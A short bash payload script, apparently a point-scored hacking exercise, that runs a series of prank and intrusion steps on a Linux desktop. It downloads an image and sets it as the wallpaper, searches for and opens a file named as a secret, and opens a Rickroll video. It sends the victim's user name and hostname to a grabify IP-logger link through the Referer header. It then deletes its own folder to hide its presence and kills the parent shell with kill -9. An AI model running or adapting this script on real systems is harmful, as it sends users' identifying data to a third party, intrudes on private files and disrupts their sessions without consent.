#!/bin/bash

# 1. Create a folder inside a folder (40)
mkdir -p $HOME/tonysdg/stuff

# 2. Create a text file (10)
echo "hello, world!" >> $HOME/tonysdg/stuff/message.txt

# 3. Create & delete another file (20)
echo "goodbye, world!" >> $HOME/tonysdg/stuff/message2.txt
rm $HOME/tonysdg/stuff/message2.txt

# 4. Download a file to the desktop (40)
XKCD_IMG=https://imgs.xkcd.com/comics/how_hacking_works_2x.png
curl --silent --output $HOME/Desktop/xkcd.png "${XKCD_IMG}"

# 5. Change the wallpaper (20)
WALLPAPER="file://$HOME/Desktop/xkcd.png"
gsettings set org.gnome.desktop.background picture-uri ${WALLPAPER}

# 6. Find a file named TimsTerribleSecret.txt and open it
find $HOME -name "TimsTerribleSecret.txt" -exec xdg-open {} \;

# 7. Rick roll! (40)
xdg-open https://www.youtube.com/watch?v=dQw4w9WgXcQ

# 8. Steal data via grabify (30)
#    Link to see data: https://grabify.link/track/998QR8
GRABIFY=https://grabify.link/X0LTSL
curl --silent --output /dev/null --referer "$(whoami) $(hostname)" ${GRABIFY}

# 9. Clean-up your presence
rm -rf $HOME/tonysdg

# 10. Kill a task, and exit (40 + 50)
kill -9 $PPID
